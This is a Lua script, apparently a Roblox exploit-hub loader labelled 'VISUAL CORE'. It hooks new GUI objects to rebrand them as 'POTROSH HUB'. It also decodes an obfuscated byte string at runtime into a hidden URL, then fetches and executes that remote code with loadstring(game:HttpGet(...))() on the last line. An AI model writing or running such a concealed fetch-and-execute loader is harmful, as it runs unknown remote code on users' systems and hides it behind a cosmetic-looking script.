
--[[ STAGE 2: VISUAL CORE ]]
local qCjrS5az73c1Q_BUHw="\022\053\056\055\061\119\111\114\072\058\083\125\073\062\092\067\099\083\105\106\095\111\099\098\100\125\113\109\134\179\123\122\123\192\130\134\136\142\141\152\147\154\154\178\166\228\170\189\167\180\175\206\187\185\188\002\195\202\197\205\017\180\200\202\182\234\244\236\252\000\232\242\010\232\221\248\255\007\007\031\253\004\019\044\044\032\037\018\125\045\045\128\135\139\060\065\124\061\089\072"local waiTgVBL1J5w89N=200 local UHjrnBytAJP4Xlpp=98 local AAXjsOcvDVxGyoC=0 local s3E1DpY4SKp6MzQU=3 local dZ0RXrDT63mt8dX=17 local cRaa6aSxyFGGc_cV2_3V=false local g88mA54KxD07RM2NlXo=bit32 and bit32.bxor if not g88mA54KxD07RM2NlXo then g88mA54KxD07RM2NlXo=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local eoKFHUsAiCxWGzCd5sxy44={}for aZ_uAuDxuZREgU=1,#qCjrS5az73c1Q_BUHw do local z53k3udMh3Er3=string.byte(qCjrS5az73c1Q_BUHw,aZ_uAuDxuZREgU)local Z_Bxtqxg4AXtj14=(UHjrnBytAJP4Xlpp+(aZ_uAuDxuZREgU*s3E1DpY4SKp6MzQU)+dZ0RXrDT63mt8dX)%256 if AAXjsOcvDVxGyoC==0 then z53k3udMh3Er3=(z53k3udMh3Er3-Z_Bxtqxg4AXtj14)%256 eoKFHUsAiCxWGzCd5sxy44[aZ_uAuDxuZREgU]=string.char(g88mA54KxD07RM2NlXo(z53k3udMh3Er3,waiTgVBL1J5w89N))else z53k3udMh3Er3=g88mA54KxD07RM2NlXo(z53k3udMh3Er3,waiTgVBL1J5w89N)eoKFHUsAiCxWGzCd5sxy44[aZ_uAuDxuZREgU]=string.char((z53k3udMh3Er3-Z_Bxtqxg4AXtj14)%256)end end local R26q1yRmHDQMuh_qdmcW66=table.concat(eoKFHUsAiCxWGzCd5sxy44)if cRaa6aSxyFGGc_cV2_3V then R26q1yRmHDQMuh_qdmcW66=string.reverse(R26q1yRmHDQMuh_qdmcW66)end local cRrthOfqeTiPE97=R26q1yRmHDQMuh_qdmcW66
local HubName = "POTROSH HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(cRrthOfqeTiPE97))()
